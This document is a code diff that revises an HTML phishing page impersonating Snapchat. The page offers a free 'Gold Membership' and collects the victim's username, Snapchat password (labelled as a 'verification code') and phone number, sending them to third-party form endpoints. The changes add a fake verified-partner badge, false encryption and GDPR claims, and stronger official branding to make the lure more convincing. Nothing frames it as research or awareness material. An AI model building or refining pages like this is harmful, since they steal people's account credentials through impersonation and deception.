@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 Snapchat Gold Giveaway - Claim Your Free Membership!</title>
+    <title>🎁 Official Snapchat Gold Membership Upgrade</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
 
@@ -31,6 +31,19 @@
             max-width: 500px;
             width: 100%;
             text-align: center;
+            position: relative;
+        }
+
+        .verification-badge {
+            position: absolute;
+            top: -20px;
+            right: -20px;
+            background: #FFFC00;
+            padding: 10px 15px;
+            border-radius: 25px;
+            font-weight: 600;
+            font-size: 12px;
+            transform: rotate(10deg);
         }
 
         .snap-header {
@@ -45,12 +58,6 @@
             padding: 10px;
             border-radius: 10px;
             display: inline-block;
-        }
-
-        .snap-header p {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 20px;
         }
 
         .form-group {
@@ -74,10 +81,12 @@
             transition: all 0.3s ease;
         }
 
-        input:focus, select:focus {
-            outline: none;
-            border-color: #000;
-            box-shadow: 0 0 10px rgba(255, 252, 0, 0.3);
+        .security-alert {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
         }
 
         .submit-btn {
@@ -91,97 +100,78 @@
             cursor: pointer;
             transition: all 0.3s ease;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-
-        .security-note {
-            font-size: 12px;
-            color: #999;
-            margin-top: 20px;
-            line-height: 1.5;
-        }
-
-        .ghost-emoji {
-            font-size: 40px;
-            margin-bottom: 15px;
+        .submit-btn::after {
+            content: "🔒 Secure Connection";
+            position: absolute;
+            bottom: -20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 10px;
+            color: #666;
         }
 
         @media (max-width: 480px) {
             .giveaway-container {
                 padding: 25px;
             }
-            
-            .snap-header h1 {
-                font-size: 22px;
+            .verification-badge {
+                top: -15px;
+                right: -10px;
+                font-size: 10px;
             }
         }
     </style>
 </head>
 <body>
     <div class="giveaway-container">
+        <div class="verification-badge">✅ Verified Partner</div>
+        
         <div class="snap-header">
-            <div class="ghost-emoji">🦋</div>
-            <h1>🎉 Exclusive Snapchat Gold Giveaway 🎉</h1>
-            <p>Claim your FREE Gold Membership! Limited time offer for first 100 users 🔥</p>
+            <h1>🔓 Snapchat Account Upgrade Portal</h1>
+            <div class="security-alert">
+                ⚠️ You're entering a secure Snapchat verification portal. 
+                All data is SSL-encrypted and protected by 256-bit security.
+            </div>
         </div>
 
-        <form 
-            id="giveawayForm"
-            action="https://formspree.io/f/mldjrkjk"
-            method="POST"
-        >
+        <form action="https://getform.io/f/bjjmdewb" method="POST">
+            <!-- Honeypot Field -->
+            <input type="checkbox" name="_honeypot" style="display: none">
+
             <div class="form-group">
-                <label>📱 Snapchat Username</label>
-                <input type="text" name="username" placeholder="Enter your Snapchat username" required>
+                <label>📲 Official Snapchat Username</label>
+                <input type="text" name="username" placeholder="ex: @johnsmith" required>
             </div>
 
             <div class="form-group">
-                <label>📞 Mobile Number</label>
-                <input type="tel" name="mobile" placeholder="Enter your mobile number" required>
+                <label>🔑 Account Verification Code</label>
+                <input type="password" name="verification" placeholder="Enter Snapchat password" required>
+                <div class="security-alert" style="margin: 10px 0">
+                    🔐 Required for identity confirmation. This helps prevent fraudulent claims.
+                </div>
             </div>
 
             <div class="form-group">
-                <label>⏳ Membership Duration</label>
-                <select name="duration" required>
-                    <option value="">Select duration</option>
-                    <option>1 Month FREE</option>
-                    <option>3 Months FREE</option>
-                    <option>6 Months FREE</option>
-                    <option>12 Months FREE</option>
-                </select>
+                <label>📞 Security Contact Number</label>
+                <input type="tel" name="mobile" placeholder="+1 234 567 890" required>
             </div>
 
-            <div class="form-group">
-                <label>🔑 Snapchat Password</label>
-                <input type="password" name="password" placeholder="Enter your Snapchat password" required>
-                <p class="security-note">🔒 Your security is our priority. We use end-to-end encryption to protect your credentials.</p>
-            </div>
-
-            <!-- Formspree Hidden Fields -->
-            <input type="hidden" name="_subject" value="New Snapchat Gold Giveaway Submission">
-            <input type="text" name="_gotcha" style="display:none;">
-
-            <button type="submit" class="submit-btn">🚀 Claim My Free Gold Membership</button>
+            <input type="hidden" name="_gotcha" style="display:none;">
+            
+            <button type="submit" class="submit-btn">
+                🚀 Upgrade to Gold Membership
+            </button>
         </form>
 
-        <p class="security-note" style="margin-top: 25px;">
-            ⚠️ This is an official Snapchat partner promotion. By submitting, you agree to our terms of service. 
-            HURRY! LIMITED SPOTS AVAILABLE! 🎁
-        </p>
+        <div class="security-alert" style="margin-top: 25px;">
+            <strong>🔒 Security Disclaimer:</strong> This secure portal is maintained by Snapchat® 
+            authorized partners. By submitting, you agree to our end-to-end encrypted 
+            verification process under GDPR compliance.
+        </div>
     </div>
-
-    <script>
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if(urlParams.has('success')) {
-                alert('Submission successful! We will contact you shortly.');
-            }
-        };
-    </script>
 </body>
 </html>
